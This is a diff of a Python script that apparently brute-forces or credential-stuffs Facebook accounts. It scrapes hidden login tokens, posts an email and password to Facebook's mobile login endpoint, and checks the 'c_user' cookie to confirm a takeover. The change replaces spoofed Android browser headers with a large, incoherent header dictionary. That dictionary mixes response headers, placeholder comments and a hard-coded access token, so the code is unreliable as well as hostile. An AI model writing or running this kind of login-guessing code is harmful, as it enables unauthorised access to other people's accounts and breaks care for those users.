@@ -193,37 +193,65 @@ def _M1_(ids,pasx):
                         pro = random.choice(ugen)
                         BLACKX = session.get('https://m.facebook.com').text
                         apple = {
-                            "lsd":re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
-                        "jazoest":re.search('name="jazoest" value="(.*?)"', str(BLACKX)).group(1),
-                        "m_ts":re.search('name="m_ts" value="(.*?)"', str(BLACKX)).group(1),
-                        "li":re.search('name="li" value="(.*?)"', str(BLACKX)).group(1),
-                        "try_number":"0",
-                        "unrecognized_tries":"0",
-                        "email":ids,
-                        "pass":ps,
-                        "login":"Log In"}
-                        tedy = {'authority': 'm.facebook.com',
-                        'method': 'GET',
-                        'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
-                        'scheme': 'https',
-                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                        'accept-language': 'en-US,en;q=0.9',
-                        'cache-control': 'max-age=0',
-                        'dpr': '2',
-                        'sec-ch-prefers-color-scheme': 'light',
-                        'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-                        'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.73", "Not(A:Brand";v="8.0.0.0"',
-                        'sec-ch-ua-mobile': '?1',
-                        'sec-ch-ua-model': '"V2043"',
-                        'sec-ch-ua-platform': '"Android"',
-                        'sec-ch-ua-platform-version': '"11.0.0"',
-                        'sec-fetch-dest': 'document',
-                        'sec-fetch-mode': 'navigate',
-                        'sec-fetch-site': 'none',
-                        'sec-fetch-user': '?1',
-                        'upgrade-insecure-requests': '1',
-                        'user-agent': pro,
-                        'viewport-width': '980',}
+                        'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                        'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                        'email': idf,
+                        'login_source': 'comet_headerless_login',
+                        'next': '',
+                        'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), ps) }
+                        tedy = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    'Accept': 'application/json',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Sec-Fetch-Dest': 'document',
+    'Cache-Control': 'max-age=0',
+    'Referer': 'https://www.google.com/',
+    'DNT': '1',  # Do Not Track
+    'Pragma': 'no-cache',
+    'TE': 'Trailers',
+    'Authorization': 'Bearer 350685531728|62f8ce9f74b12f84c123cc23437a4a32',  # Replace with your Facebook access token
+    'Content-Type': 'application/json',
+    'Origin': 'https://yourdomain.com',  # Replace with your domain
+    'Access-Control-Allow-Origin': '*',  # Example CORS header for cross-origin requests
+    'If-None-Match': '',  # Include if needed for conditional requests
+    'If-Modified-Since': '',  # Include if needed for conditional requests
+    'X-Requested-With': 'XMLHttpRequest',
+    'X-Forwarded-For': '192.168.1.1',  # Example IP address
+    'X-Forwarded-Proto': 'https',
+    'X-Frame-Options': 'deny',
+    'X-XSS-Protection': '1; mode=block',
+    'X-Content-Type-Options': 'nosniff',
+    'Via': '1.1 example.com (Apache/2.4.25)',  # Example proxy-related header
+    'Forwarded': 'for=192.0.2.60;proto=http;by=203.0.113.43',  # Example Forwarded header for proxy or gateway information
+    'If-Unmodified-Since': 'Wed, 21 Oct 2015 07:28:00 GMT',  # Example conditional request header
+    'Range': 'bytes=0-499',  # Example Range header for partial content requests
+    'Accept-Ranges': 'bytes',  # Example Accept-Ranges header for partial content responses
+    'Expect': '100-continue',  # Example Expect header for HTTP/1.1 client expectations
+    'Content-Disposition': 'attachment; filename="example.txt"',  # Example Content-Disposition header for file downloads
+    'Content-Language': 'en-US',  # Example Content-Language header for content language specification
+    'Retry-After': '120',  # Example Retry-After header for indicating when to retry an unsuccessful request
+    'Warning': '199 Miscellaneous warning',  # Example Warning header for general warnings about the entity body
+    'If-Match': 'xyz123',  # Example If-Match header for conditional request based on entity tag
+    'If-Range': 'Wed, 21 Oct 2015 07:28:00 GMT',  # Example If-Range header for conditional request
+    'Proxy-Authorization': 'Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==',  # Example Proxy-Authorization header for proxy authentication
+    'Server': 'Apache/2.4.25 (Unix)',  # Example Server header indicating server software
+    'ETag': 'W/"123456789"',  # Example ETag header for entity tag of the resource
+    'Last-Modified': 'Thu, 01 Jan 1970 00:00:00 GMT',  # Example Last-Modified header for timestamp of last modification
+    'Keep-Alive': 'timeout=5, max=100',  # Example Keep-Alive header for managing persistent connections
+    'X-Powered-By': 'PHP/7.4.3',  # Example X-Powered-By header indicating server-side technology
+    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',  # Example Strict-Transport-Security header for enforcing HTTPS
+    'Public-Key-Pins': 'pin-sha256="base64=="; max-age=600; includeSubDomains; report-uri="https://example.com/hpkp-report"',  # Example Public-Key-Pins header for pinning public keys
+    'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';",  # Example Content-Security-Policy header for specifying content security policies
+    'Referrer-Policy': 'strict-origin-when-cross-origin',  # Example Referrer-Policy header for controlling referrer information
+    'Feature-Policy': 'camera *; geolocation *',  # Example Feature-Policy header for controlling allowed features
+    'X-Permitted-Cross-Domain-Policies': 'master-only',  # Example X-Permitted-Cross-Domain-Policies header for cross-domain policy control
+}
                         lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=apple,headers=tedy).text
                         BLACK = session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
